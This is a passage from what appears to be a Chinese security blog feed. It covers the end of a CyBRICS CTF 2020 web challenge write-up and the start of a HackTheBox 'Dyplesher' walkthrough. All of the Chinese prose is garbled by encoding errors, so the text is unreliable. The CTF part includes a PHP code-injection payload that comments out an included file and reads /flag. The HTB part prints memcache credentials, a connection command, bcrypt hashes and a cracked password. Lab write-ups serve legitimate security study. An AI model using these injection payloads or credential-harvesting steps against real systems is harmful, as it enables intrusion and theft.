templateå‚æ•°é€‰æ‹©templateã€‚å‰å¾€newtemplate.phpã€‚å‘ç°å…¶é™åˆ¶äº†æˆ‘ä»¬templateçš„ä»£ç ä¸­ä¸èƒ½å«æœ‰<code>&lt;?</code>ä¸”å¿…é¡»åŒ…å«å®ƒè¦æ±‚çš„idæ ‡ç­¾ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!@$_SESSION[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line"></span><br><span class="line">$error = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'html'</span>])) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $html = trim($_POST[<span class="string">'html'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (strpos($html, <span class="string">'&lt;?'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            $error = <span class="string">"Bad chars"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $requiredBlocks = [</span><br><span class="line">            <span class="string">'id="back"'</span>,</span><br><span class="line">            <span class="string">'id="field" name="field"'</span>,</span><br><span class="line">            <span class="string">'id="digit0"'</span>,</span><br><span class="line">            <span class="string">'id="digit1"'</span>,</span><br><span class="line">            <span class="string">'id="digit2"'</span>,</span><br><span class="line">            <span class="string">'id="digit3"'</span>,</span><br><span class="line">            <span class="string">'id="digit4"'</span>,</span><br><span class="line">            <span class="string">'id="digit5"'</span>,</span><br><span class="line">            <span class="string">'id="digit6"'</span>,</span><br><span class="line">            <span class="string">'id="digit7"'</span>,</span><br><span class="line">            <span class="string">'id="digit8"'</span>,</span><br><span class="line">            <span class="string">'id="digit9"'</span>,</span><br><span class="line">            <span class="string">'id="plus"'</span>,</span><br><span class="line">            <span class="string">'id="equals"'</span>,</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> ($requiredBlocks <span class="keyword">as</span> $block) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($html, $block) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                $error = <span class="string">"Missing required block: '$block'"</span>;</span><br><span class="line">                <span class="keyword">break</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $uuid = uuid();</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="string">"calcs/$userid/templates/$uuid.html"</span>, $html)) &#123;</span><br><span class="line">            $error = <span class="string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        redir(<span class="string">"."</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="row"&gt;</span><br><span class="line">        &lt;div class="p-5 mx-auto col-10 col-md-10 bg-info"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($error) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">          &lt;div class="alert alert-danger" role="alert"&gt;</span><br><span class="line">            &lt;button type="button" class="close" data-dismiss="alert"&gt;Ã—&lt;/button&gt;</span><br><span class="line">            &lt;h4 class="alert-heading"&gt;Error&lt;/h4&gt;</span><br><span class="line">            &lt;p class="mb-0"&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">          &lt;h3 class="display-3"&gt;New template&lt;/h3&gt;</span><br><span class="line">          &lt;div class="px-4 order-1 order-md-2 col-lg-12"&gt;</span><br><span class="line">            &lt;h2 class="mb-4"&gt;Insert code&lt;/h2&gt;</span><br><span class="line">            &lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">              &lt;div class="form-group"&gt; &lt;textarea style="min-height: 100px; font-family: 'Fira Code', Consolas, monospace;" placeholder="HTML" class="form-control form-control-sm" name="html" oninput="this.style.height = ''; this.style.height = (this.scrollHeight + 10) +'px'"&gt;&lt;?=htmlspecialchars(@$_POST['html'])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-lg btn-outline-secondary mx-3 px-3"&gt;&lt;i class="fa fa-plus-square fa-fw fa-1x py-1"&gt;&lt;/i&gt; Create Template&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å‘ç°ã€‚calc.phpå¦‚æœä¸ä¼ é€’shareå‚æ•°çš„è¯ã€‚å°†åªæ˜¯ç®€å•çš„requireæˆ‘ä»¬çš„template.ä½†æ˜¯å€˜è‹¥ä¼ é€’share.åˆ™å°†è¿›è¡Œä¸€ä¸ªæ‹¼æ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">    $calc = uuid();</span><br><span class="line">    file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">    redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„å˜é‡fieldä¸ä¹‹åçš„<code>inc/calclib.html</code>ï¼Œä»¥åŠè‡ªå·±çš„templateè¿›è¡Œæ‹¼æ¥ã€‚å½“å†…å®¹ä½œä¸ºfile_put_contentsçš„å‚æ•°å†™è¿›æ–°çš„phpæ–‡ä»¶æ—¶ã€‚<code>&lt;?=</code>æ€»æ˜¯å¯ç”¨çš„(å³ä½œä¸ºecho è°ƒç”¨)é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•è§£å†³æ‰ä¸­é—´æ‹¼æ¥çš„æ–‡ä»¶<code>inc/calclib.html</code>å³å¯ã€‚é€šè¿‡ä½¿ç”¨æ³¨é‡Šç¬¦å°†ä¸¤è€…ä¸­é—´çš„htmlæ–‡ä»¶æ³¨é‡Šæ‰ï¼Œå¹¶åœ¨templateä¸­å†™å…¥æ¶æ„ä»£ç å°±èƒ½å®Œæˆ</p><p><img src="/2020/07/26/CyBRICS-CTF-2020/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æœ¬åœ°æ¨¡æ‹Ÿå†™å…¥çš„æ–‡ä»¶ã€‚å¯ä»¥çœ‹åˆ°ä¸­é—´çš„éƒ¨åˆ†è¢«æ³¨é‡Šæ‰ã€‚æˆ‘ä»¬åªéœ€æ³¨æ„æ­£ç¡®é—­åˆæ‹¬å·ã€‚<br>payload<br>htmlå†…å®¹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"field"</span> <span class="attr">name</span>=<span class="string">"field"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit0"</span> <span class="attr">data-append</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit1"</span> <span class="attr">data-append</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit2"</span> <span class="attr">data-append</span>=<span class="string">"2"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit3"</span> <span class="attr">data-append</span>=<span class="string">"3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit4"</span> <span class="attr">data-append</span>=<span class="string">"4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit5"</span> <span class="attr">data-append</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit6"</span> <span class="attr">data-append</span>=<span class="string">"6"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit7"</span> <span class="attr">data-append</span>=<span class="string">"7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit8"</span> <span class="attr">data-append</span>=<span class="string">"8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit9"</span> <span class="attr">data-append</span>=<span class="string">"9"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"plus"</span> <span class="attr">data-append</span>=<span class="string">" + "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"minus"</span> <span class="attr">data-append</span>=<span class="string">" - "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"times"</span> <span class="attr">data-append</span>=<span class="string">" * "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"div"</span> <span class="attr">data-append</span>=<span class="string">" / "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"point"</span> <span class="attr">data-append</span>=<span class="string">"."</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"clear"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"back"</span> <span class="attr">value</span>=<span class="string">"â† Back"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"share"</span> <span class="attr">name</span>=<span class="string">"share"</span> <span class="attr">value</span>=<span class="string">"Share"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"equals"</span> /&gt;</span></span><br><span class="line">*/readfile("/flag")));</span><br></pre></td></tr></table></figure><p>ä¹‹åæ¥åˆ°calc.phpä¼ å€¼<code>field=/*&amp;share=1</code>å³å¯åœ¨é‡å®šå‘åå¾—åˆ°å†™å…¥shellçš„åœ°å€ã€‚<br>è¿œç¨‹getflag<br><img src="/2020/07/26/CyBRICS-CTF-2020/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>é¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ã€‚ä½“éªŒä¸é”™ã€‚åœ¨è¿™ä¹‹å‰çš„ä¸€åœº3kCTFå› ä¸ºæ—¶é—´åŸå› å†™ä¸äº†wpäº†,é¢˜ç›®è´¨é‡å€’æ˜¯æŒºå¥½çš„ã€‚ä¸‹å‘¨å¼€å§‹hwå°±ä¸æ›´æ–‡ç« </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Dyplesher</title>
      <link href="2020/07/24/hackthebox-Dyplesher/"/>
      <url>2020/07/24/hackthebox-Dyplesher/</url>
      
        <content type="html"><![CDATA[<p>  Dyplesheré¶æœºæ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å®Œæˆçš„ç°å½¹insaneéš¾åº¦htbé¶æœºã€‚é¶æœºæ¶‰åŠçš„æœåŠ¡ç›¸å¯¹æ¯”è¾ƒå¤š,åŒ…æ‹¬web,gogs,minecraft,memcacheç­‰ç­‰ã€‚ä¸è¿‡è¯´å®è¯åšå®Œåæ„Ÿè§‰éš¾åº¦è·ŸTravelå·®ä¸å¤š,åˆ°ä¸äº†insaneéš¾åº¦ã€‚å¯èƒ½ä¸»è¦æ˜¯é‡Œé¢çš„JavaçŸ¥è¯†å¯¹äºå¤§éƒ¨åˆ†äººæ¥è¯´åç¹çäº†ã€‚æ€»ä½“ä¸Šæ„Ÿè§‰è¿˜æ˜¯ä¸é”™çš„ã€‚è¿™é‡Œè¿˜æ˜¯ç®€å•è®°å½•ä¸‹è¿‡ç¨‹ä»¥åŠææƒéƒ¨åˆ†å­¦åˆ°çš„çŸ¥è¯†å§ã€‚</p><a id="more"></a><p><img src="/2020/07/24/hackthebox-Dyplesher/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœºip:10.10.10.190</li><li>kaliip: 10.10.14.23</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>é¦–å…ˆæ˜¯nmapåŸºæœ¬æ‰«æå¾—åˆ°ä¸‰ä¸ªç«¯å£22,80,3000.è¿›ä¸€æ­¥æ‰«æå‘ç°è¿˜æœ‰å…¶ä»–å‡ ä¸ªç«¯å£ã€‚4369(epmd),5672(amqp),11211ç­‰ã€‚</p><p>å…¶ä¸­11211æ˜¯memcacheå¯¹åº”ç«¯å£ã€‚ä¹‹å‰åœ¨travelä¸­ç”¨è¿‡,æ‰€ä»¥å°è±¡æ¯”è¾ƒæ·±åˆ»ã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯ç®€å•ä»ä½ç«¯å£å¼€å§‹å®¡è®¡ã€‚</p><p>é¦–å…ˆweb80ç«¯å£å‘ç°æç¤ºè¿™é‡Œå¯èƒ½è·Ÿmcç›¸å…³ã€‚ä»cookieçš„é…ç½®å¯ä»¥çœ‹å‡ºä¼¼ä¹ä½¿ç”¨äº†laravelæ¡†æ¶ã€‚å› ä¸ºæ˜¯é»‘ç›’æ‰€ä»¥ä¸ç¡®å®šæ˜¯å¦èƒ½ç”¨RCEæ‰“ã€‚</p><p>æ¥ä¸‹æ¥é¦–é¡µè¿˜æç¤ºäº†æˆ‘ä»¬ä¸€ä¸ªå­åŸŸå<code>test.dyplesher.htb</code>ã€‚åŠ åˆ°hostsä¸­ã€‚</p><p>é¡µé¢çš„<code>/staff</code>æœ‰ä¸‰ä¸ªç”¨æˆ·å</p><p><img src="/2020/07/24/hackthebox-Dyplesher/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¸‰ä¸ªç”¨æˆ·ååœ¨åé¢ä¼šç»å¸¸å‡ºç°ã€‚</p><p>æ¥ä¸‹æ¥é¡µé¢ä¿¡æ¯æ”¶é›†å®Œäº†ã€‚æˆ‘ä»¬çˆ†ç ´ä¸‹è·¯å¾„ã€‚å‘ç°å­˜åœ¨<code>/login</code>é¡µé¢ã€‚ç®€å•å°è¯•ç™»å½•æœªæœ,çœ‹æ¥éœ€è¦å¦å¤–æ”¶é›†ä¿¡æ¯,æˆ–è€…loginä¸æ˜¯ç›®çš„ã€‚</p><p>3000ç«¯å£æ˜¯ä¸ªgogsæœåŠ¡ã€‚æä¾›gitçš„è¯çœ‹æ¥æ˜¯åˆæœ‰ä¿¡æ¯æ³„éœ²äº†ã€‚ä¸è¿‡åŒæ ·æˆ‘ä»¬æ²¡æœ‰å¯ç”¨çš„ä¿¡æ¯ã€‚ä¸è¿‡gogså€’æ˜¯åœ¨userså¤„æç¤ºæˆ‘ä»¬æœ‰åˆšåˆšä¸Šé¢çš„ä¸‰ä¸ªç”¨æˆ·ã€‚</p><p>æ¥ä¸‹æ¥å»å¾€test.dyplesher.htb.é¡µé¢åªæ¥å—ä¸¤ä¸ªå‚æ•°,ä¼¼ä¹æ˜¯åœ¨åˆ¤æ–­ä½ çš„ä¸¤ä¸ªè¾“å…¥æ˜¯å¦ä¸€è‡´ã€‚ç„¶åå°è¯•æ³¨å…¥ä¹Ÿæœªæœã€‚</p><p>ç»§ç»­æ‰«ç›®å½•ã€‚å¾—åˆ°<code>.git</code>æ³„éœ²ã€‚ä½¿ç”¨githackdumpä¸‹æ¥ã€‚<br>å¾—åˆ°index.phpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;h1&gt;Add key <span class="keyword">and</span> value to memcache&lt;h1&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"GET"</span> NAME=<span class="string">"test"</span> ACTION=<span class="string">""</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"add"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"val"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Send"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'add'</span>] != $_GET[<span class="string">'val'</span>])&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> Memcached();</span><br><span class="line">        $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, <span class="keyword">true</span>);</span><br><span class="line">        $m-&gt;setSaslAuthData(<span class="string">"felamos"</span>, <span class="string">"zxcvbnm"</span>);</span><br><span class="line">        $m-&gt;addServer(<span class="string">'127.0.0.1'</span>, <span class="number">11211</span>);</span><br><span class="line">        $m-&gt;add($_GET[<span class="string">'add'</span>], $_GET[<span class="string">'val'</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Done!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"its equal"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ç»„memcacheè´¦æˆ·ã€‚å°è¯•webé¡µé¢çš„ç™»å½•æœªæœã€‚äºæ˜¯ç›´æ¥è¿æ¥memcache.æ­¤å¤„æˆ‘ä»¬ä½¿ç”¨nodejsçš„memcache-cli.npmå…¨å±€ä¸‹è½½å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcache-cli felamos:zxcvbnm@10.10.10.190:11211</span><br></pre></td></tr></table></figure><p>è¿æ¥ä¸Šåæ”¶é›†åˆ°ä¸‰ä¸ªç”¨æˆ·å(è¿˜æ˜¯ä¸Šé¢ä¸‰ä¸ªäºº)ä»¥åŠä¸‰ä¸ªbcryptå¯†ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa</span><br><span class="line">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span><br><span class="line">$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</span><br></pre></td></tr></table></figure><p>hashcatçˆ†ç ´ä¹‹.åªå¾—åˆ°ä¸€ç»„felamoså¯†ç mommy1ã€‚</p><p>ç»§ç»­ç”¨è¿™ç»„è´¦æˆ·å°è¯•ç™»å½•ã€‚æœ€ååœ¨gogså¤„ç™»å½•æˆåŠŸã€‚åœ¨80ç«¯å£ä»ç„¶ä¸èƒ½ç™»å½•,ä¸€åº¦è®©æˆ‘ä»¥ä¸ºé‚£ä¸ªç™»å½•æ˜¯å‡çš„ã€‚</p><p><img src="/2020/07/24/hackthebox-Dyplesher/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å®¡æŸ¥ç”¨æˆ·felamosçš„ä»“åº“ã€‚åªæœ‰gitlabè·Ÿmemcachedä¸¤ä¸ªã€‚å…¶ä¸­memcachedçš„æˆ‘ä»¬å·²ç»æ”¶é›†è¿‡äº†ã€‚gitlabä»“åº“å‘ç°æ²¡æœ‰å†…å®¹,ä½†æ˜¯æœ‰release.</p><p>ä¸‹è½½releaseä¸­çš„repo.zip(20mbä¸‹äº†å¿«åŠå°æ—¶â€¦â€¦éš¾å—)å¹¶è§£å‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~/htb/boxes/Dyplesher/git/repositories<span class="comment"># find .</span></span><br><span class="line">.</span><br><span class="line">./@hashed</span><br><span class="line">./@hashed/4e</span><br><span class="line">./@hashed/4e/07</span><br><span class="line">./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce</span><br><span class="line">./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle</span><br><span class="line">./@hashed/6b</span><br><span class="line">./@hashed/6b/86</span><br><span class="line">./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle</span><br><span class="line">./@hashed/4b</span><br><span class="line">./@hashed/4b/22</span><br><span 